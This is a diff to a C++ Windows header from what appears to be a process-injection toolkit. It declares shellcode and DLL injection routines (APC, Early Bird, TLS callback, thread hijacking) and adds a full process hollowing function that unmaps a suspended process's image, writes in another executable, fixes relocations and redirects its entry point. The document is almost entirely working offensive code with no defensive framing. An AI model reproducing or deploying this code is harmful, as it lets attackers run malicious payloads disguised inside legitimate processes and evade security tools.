@@ -1,11 +1,15 @@
 #pragma once
 
+
 #include <iostream>
 #include <Windows.h>
+//#include <Ntsecapi.h>
+#include <winternl.h>
 #include <tlhelp32.h>
 #include <vector>
 #include <string>
 #include <DbgHelp.h>
+
 
 #include "Utiliti.h"
 
@@ -21,6 +25,8 @@ DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName);
 DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName);
 DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName , WCHAR* ExecutablePath );
 DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName);
+DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutable);
+
 
 DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {
 
@@ -344,4 +350,164 @@ DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName) {
 	}
 
 	return -1;
+}
+
+//Crashes With Some 64bit Process (like svchost.exe,...)
+DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutable)
+{
+	PROCESS_INFO ProcessInfo;
+	DWORD Status = FALSE;
+
+	Status = StartExecutableAsSuspended(TargetExecutable, &ProcessInfo, CREATE_SUSPENDED);
+	if (!Status) {
+		return -1;
+	}
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessInfo.PID);
+
+	PEBmy* pPEB = ReadRemotePEB(hProcess);
+
+	PLOADED_IMAGE pImage = ReadRemoteImage(hProcess, pPEB->ImageBaseAddress);
+
+	BYTE * SourceFileData = ReadDataFromFile(SourceExecutable);
+
+	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD64)SourceFileData);
+
+	PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders((DWORD64)SourceFileData);
+
+	HMODULE hNTDLL = GetModuleHandleA("ntdll");
+
+	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
+
+	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
+
+	DWORD64 dwResult = NtUnmapViewOfSection(hProcess, pPEB->ImageBaseAddress);
+	if (dwResult)
+	{
+		printf("Error unmapping section 0x%x\r\n",GetLastError());
+		return -1;
+	}
+
+	printf("%p\n", pPEB->ImageBaseAddress);
+	PVOID pRemoteImage = VirtualAllocEx(hProcess, pPEB->ImageBaseAddress, pSourceHeaders->OptionalHeader.SizeOfImage,
+		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (!pRemoteImage)
+	{
+		printf("VirtualAllocEx call failed 0x%x\r\n",GetLastError());
+		return -1;
+	}
+	printf("%p    %d\n", pRemoteImage, pSourceHeaders->OptionalHeader.SizeOfImage);
+
+
+	DWORD64 dwDelta = (DWORD64)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
+
+	pSourceHeaders->OptionalHeader.ImageBase = (DWORD64)pPEB->ImageBaseAddress;
+
+	if (!WriteProcessMemory(hProcess, pPEB->ImageBaseAddress, SourceFileData, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0)) {
+		printf("Error writing process memory 0x%x\r\n", GetLastError());
+
+		return -1;
+	}
+
+	for (DWORD64 x = 0; x < pSourceImage->NumberOfSections; x++)
+	{
+		if (!pSourceImage->Sections[x].PointerToRawData)
+			continue;
+
+		PVOID pSectionDestination = (PVOID)((DWORD64)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
+
+		if (!WriteProcessMemory(hProcess, pSectionDestination, &SourceFileData[pSourceImage->Sections[x].PointerToRawData], 
+								pSourceImage->Sections[x].SizeOfRawData, 0)) 
+		{
+			printf("Error writing process memory 0x%x\r\n", GetLastError());
+			return -1;
+		}
+	}
+
+	if (dwDelta)
+		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
+		{
+			char pSectionName[] = ".reloc";
+
+			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
+				continue;
+
+			DWORD64 dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
+			DWORD dwOffset = 0;
+
+			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+			while (dwOffset < relocData.Size)
+			{
+				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&SourceFileData[dwRelocAddr + dwOffset];
+
+				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
+
+				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
+
+				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&SourceFileData[dwRelocAddr + dwOffset];
+
+				for (DWORD y = 0; y < dwEntryCount; y++)
+				{
+					dwOffset += sizeof(BASE_RELOCATION_ENTRY);
+
+					if (pBlocks[y].Type == 0)
+						continue;
+
+					DWORD dwFieldAddress =
+						pBlockheader->PageAddress + pBlocks[y].Offset;
+
+					DWORD64 dwBuffer = 0;
+					BOOL bSuccess;
+					bSuccess = ReadProcessMemory(hProcess, (PVOID)((DWORD64)pPEB->ImageBaseAddress + dwFieldAddress),
+												&dwBuffer, sizeof(DWORD64), 0);
+					if (!bSuccess)
+					{
+						printf("Error reading memory  0x%x\r\n", GetLastError());
+						continue;
+
+					}
+					dwBuffer += dwDelta;
+					bSuccess = WriteProcessMemory(hProcess, (LPVOID)((DWORD64)pPEB->ImageBaseAddress + dwFieldAddress),
+												&dwBuffer, sizeof(DWORD64), 0);
+				
+					if (!bSuccess) {
+						printf("Error writing memory  0x%x\r\n", GetLastError());
+						continue;
+					}
+				}
+			}
+
+			break;
+		}
+
+	DWORD64 dwEntrypoint = (DWORD64)pPEB->ImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
+
+	LPCONTEXT pContext = new CONTEXT();
+	pContext->ContextFlags = CONTEXT_FULL;
+
+	if (!GetThreadContext(ProcessInfo.MainThreadHandle, pContext))
+	{
+		printf("Error getting context Erro Code 0x%x\r\n",GetLastError());
+		return -1;
+	}
+#if _WIN64			
+	pContext->Rcx = (DWORD64)dwEntrypoint;
+#else
+	pContext->Eax = dwEntrypoint;
+#endif
+
+	if (!SetThreadContext(ProcessInfo.MainThreadHandle, pContext))
+	{
+		printf("Error setting context Error Code 0x%x\r\n",GetLastError());
+		return -1;
+	}
+
+	printf("%p\n", dwEntrypoint);
+	/*if (!ResumeThread(ProcessInfo.MainThreadHandle))
+	{
+		printf("Error resuming thread Error Code 0x%x\r\n",GetLastError());
+		return -1;
+	}*/
+
+	return 0;
 }
